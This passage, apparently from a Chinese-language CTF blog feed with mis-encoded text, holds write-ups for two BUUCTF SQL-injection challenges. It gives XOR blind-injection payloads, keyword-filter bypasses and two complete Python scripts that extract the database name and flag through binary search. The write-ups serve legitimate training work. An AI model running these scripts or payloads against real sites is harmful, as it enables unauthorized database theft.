class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141354341.png" alt="image-20230828141354341"></p><p>æ‰€ä»¥ç”±æµ‹è¯•å¾—è¯¥ç½‘ç«™ä¸å›æ˜¾æ•°æ®åº“ä¿¡æ¯ï¼Œåªè¿”å›trueæˆ–falseçš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é‡‡å–ç›²æ³¨</p><p>2.é€‰æ‹©ç›²æ³¨ç±»å‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸ƒå°”ç›²æ³¨:<br>id=1 and é0(true)æˆ–id=(1)and(é0(true))<br>è¿”å›id=1çš„ç•Œé¢<br>id=1 and 0(flase)æˆ–id=(1)and(0)<br>è¿”å›id=0çš„ç•Œé¢<br><br>å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨éœ€è¦åé¢æœ‰åˆ¤æ–­è¯­å¥è¿”å›trueå’Œfalse<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1æˆ–id=&#x27;&#x27;or(é0(true))<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0æˆ–id=&#x27;&#x27;or(0)<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>ç”±äºandå’Œoréƒ½è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€‰æ‹©å¼‚æˆ–ç›²æ³¨</p><p>3.è·å–ç›²æ³¨trueå’Œfalseçš„ç•Œé¢</p><p>payload:</p><p>id&#x3D;0çš„ç•Œé¢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143418789.png" alt="image-20230828143418789"></p><p>payload:</p><p>id&#x3D;1çš„ç•Œé¢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^0<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143453303.png" alt="image-20230828143453303"></p><p>4.çˆ†æ•°æ®åº“ä¿¡æ¯:</p><p>ç”±äºlimitè¢«é™åˆ¶,æ‰€ä»¥é•¿åº¦è§„å®šå¯ä»¥ä¸ºè‡ªç”±ï¼Œä½¿ç”¨GROUP_CONCAT()è·å–å…¨éƒ¨ä¿¡æ¯</p><p>ç¬¬ä¸€æ­¥ï¼šç›´æ¥çˆ†æ•°æ®åº“çš„åå­—:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),1,1))&gt;79)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>        <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        payload2 = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.post(url=url, data=payload2)<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>        true_text = <span class="hljs-string">&quot;Error&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼šctftraih<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼šç”±äºç”±é¢˜ç›®æç¤ºå¾—ï¼Œflagåœ¨flagè¡¨çš„flagå­—æ®µä¸­ï¼Œæ‰€ä»¥ç›´æ¥çˆ†flagå­—æ®µä¿¡æ¯å³å¯:</p><p>selectè¢«è¿‡æ»¤çš„ç»•è¿‡æ–¹å¼:</p><p>å¤§å°å†™ç»•è¿‡æ³•:</p><p>è¯¥æ–¹æ³•é€‚ç”¨äºä»»ä½•åœ¨mysqlä¸­æ‰§è¡Œçš„å•è¯ä»£ç </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">seleCt<br>SeLeCt<br>SELect<br>.......<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828152946191.png" alt="image-20230828152946191"></p><p>å†…è”æ³¨é‡Šç»•è¿‡:</p><p>å½“ä¸€äº›å…³é”®è¯­å¥è¢«è¿‡æ»¤æ—¶ï¼Œå†…è”æ³¨é‡Šå°±æ˜¯æŠŠä¸€äº›ç‰¹æœ‰çš„ä»…åœ¨ mysql ä¸Šçš„è¯­å¥æ”¾åœ¨ &#x2F;*!  *&#x2F;ä¸­ï¼Œè¿™æ ·è¿™äº›è¯­å¥å¦‚æœåœ¨å…¶å®ƒæ•°æ®åº“ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†åœ¨ mysql ä¸­ä¼šæ‰§è¡Œ.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/*!select*/<br>/*!sElect*/<br>.....<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828153246186.png" alt="image-20230828153246186"></p><p>ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ–¹å¼æµ‹è¯•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1seLeCt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828153509802.png" alt="image-20230828153509802"></p><p>é€šè¿‡å“åº”ç»“æœå¯çŸ¥ï¼Œå¯ä»¥ç»•è¿‡</p><p>ç”±äºgroup_concatä¹Ÿè¢«è¿‡æ»¤ï¼Œä¸”é€šè¿‡ä¸æ–­å°è¯•ï¼Œå‘ç°å¤§å°å†™éƒ½æ— æ³•ç»•è¿‡ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çŒœæµ‹è¯¥flagå­—æ®µåªæœ‰ä¸€è¡Œå†…å®¹ï¼Œä¸”ä¸ºflagçš„å€¼</p><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828154057973.png" alt="image-20230828154057973"></p><p>åªæœ‰substrä¸­selectè¿”å›çš„åªæœ‰ä¸€è¡Œå†…å®¹æ—¶ï¼Œæ‰ä¸ä¼šå‘ç”ŸæŠ¥é”™</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((seLEct(&#123;flag&#125;)from(&#123;flag&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ctftraih&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr((seLEct(&#123;&#125;)from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(str)</span><br>            payload2 = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>            &#125;<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.post(url=url, data=payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Error&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flagå­—æ®µç¬¬1åˆ—çš„å€¼:flag&#123;8ee345ea-b7e7-4384-883c-f953214c7f79&#125; <br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{8ee345ea-b7e7-4384-883c-f953214c7f79} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL é¢˜è§£</title>
    <link href="/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"/>
    <url>/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>1.è¿›å…¥é¡µé¢:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094221524.png" alt="image-20230828094221524"></p><p>å‘ç°é¢˜ç›®æç¤ºæœ‰ç›²æ³¨</p><p>2.ç”±äºæˆ‘ä»¬ä¸çŸ¥é“æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç”¨æˆ·åå¯†ç çš„è¾“å…¥æ¥è·å–trueå’Œfalseé¡µé¢çš„å“åº”ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹ï¼Œæ— è®ºå¦‚ä½•è¿”å›çš„éƒ½æ˜¯falseç•Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶å®ƒçš„ç›²æ³¨æ³¨å…¥ç‚¹</p><p>3.æ ¹æ®é¢˜ç›®æç¤ºé€‰æ‹©ç¥ç§˜ä»£ç :<br>ç‚¹å‡»1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094621301.png" alt="image-20230828094621301"></p><p>ç‚¹å‡»2ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094644745.png" alt="image-20230828094644745"></p><p>ç‚¹å‡»3ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094710975.png" alt="image-20230828094710975"></p><p>ç‚¹å‡»4ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094729078.png" alt="image-20230828094729078"></p><p>ç‚¹å‡»5ï¼š</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094752529.png" alt="image-20230828094752529"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-FinalSQL/image-20230828094924021.png" alt="image-20230828094924021"></p><p>æ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡idè¿™ä¸ªæ³¨å…¥ç‚¹è¿›è¡Œç›²æ³¨</p><p>4.ç›²æ³¨åŸç†:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸ƒå°”ç›²æ³¨:<br>id=1 and é0(true)<br>è¿”å›id=1çš„ç•Œé¢<br>id=1 and 0(flase)<br>è¿”å›id=0çš„ç•Œé¢<br><br>å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨éœ€è¦åé¢æœ‰åˆ¤æ–­è¯­å¥è¿”å›trueå’Œfalse<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p>mysqlä¸­trueè¡¨ç¤º1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100019926.png" alt="image-20230828100019926"></p><p>mysqlä¸­falseè¡¨ç¤º0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100110579.png" alt="image-20230828100110579"></p><p>5.éšä¾¿æ³¨å…¥ï¼ŒæŸ¥çœ‹å½“å‰é¡µé¢è¿‡æ»¤çš„å†…å®¹:</p><p>è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span 